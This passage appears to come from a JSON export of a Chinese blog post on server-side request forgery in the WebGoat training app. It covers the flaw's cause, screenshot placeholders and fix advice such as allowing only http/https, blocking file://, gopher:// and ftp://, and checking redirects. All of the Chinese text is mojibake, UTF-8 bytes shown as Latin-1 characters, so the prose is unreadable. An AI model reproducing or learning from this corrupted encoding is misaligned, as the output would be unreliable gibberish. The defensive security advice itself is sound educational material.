æ¥è·å–èµ„æºå¼•èµ·çš„ï¼Œå½“è¿™ç§åŠŸèƒ½æ²¡æœ‰å¯¹åè®®ã€ç½‘ç»œå¯ä¿¡ä¾¿æ·åšå¥½é™åˆ¶æ—¶ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™ç§ç¼ºé™·æ¥è·å–å†…ç½‘æ•æ„Ÿæ•°æ®ã€DOS å†…ç½‘æœåŠ¡å™¨ã€è¯»æ–‡ä»¶ç”šè‡³äºå¯è·å–å†…ç½‘æœåŠ¡å™¨æ§åˆ¶æƒé™ç­‰ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -10\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -10\">#</a> æ¼æ´æˆå› </h2>\n<p>æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤æˆ–è€…é™åˆ¶ï¼Œæ¯”å¦‚è¯´ä»æŒ‡å®š url åœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œæ–‡æ¡£ç­‰ç­‰.</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-10\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-10\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<p>ä¸¤ä¸ªä»»åŠ¡éƒ½æ˜¯æ ¹æ®ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œè¿›è¡Œåˆ¤æ–­è¾“å…¥ï¼Œå¹¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p>\n<p><img src=\"ssrf1.png\" alt=\"\"></p>\n<p><img src=\"ssrf2.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"ssrf3.png\" alt=\"\"></p>\n<p><img src=\"ssrf4.png\" alt=\"\"></p>\n<p>ä¿®å¤å»ºè®®ï¼š</p>\n<ol>\n<li>\n<p>ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸ http å’Œ https è¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ file://,gopher://,<a href=\"ftp://%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98\">ftp:// ç­‰å¼•èµ·çš„é—®é¢˜</a></p>\n</li>\n<li>\n<p>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé˜²æ­¢åˆ©ç”¨é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€.</p>\n</li>\n<li>\n<p>ç¦æ­¢ 302 è·³è½¬ï¼Œæˆ–æ¯è·³è½¬ä¸€æ¬¡æ£€æŸ¥æ–°çš„ host æ˜¯å¦ä¸ºå†…ç½‘ ip, åç¦æ­¢</p>\n</li>\n<li>\n<p>è®¾ç½® url åå•æˆ–è€…é™åˆ¶å†…ç½‘ ip.</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"æœ€åæƒ³è¯´çš„\"><a class=\"markdownIt-Anchor\" href=\"#æœ€åæƒ³è¯´çš„\">#</a> æœ€åæƒ³è¯´çš„</h1>\n<p>è¦å¥½å¥½åŠªåŠ›ï¼Œè·Ÿç€è‡ªå·±çš„èŠ‚å¥ï¼Œä¼šè¶Šæ¥è¶Šå¥½çš„ o (ï¿£Îµï¿£*)</p>\n<p>è¿˜æœ‰è¿˜æœ‰ï¼Œè°¢è°¢å°ç”œç”œä¸€ç›´çš„é™ªä¼´ï¼Œçˆ±æ‚¨â™¡</p>\n",
            "tags": [
                "webgoat"
            ]
        }
    ]
}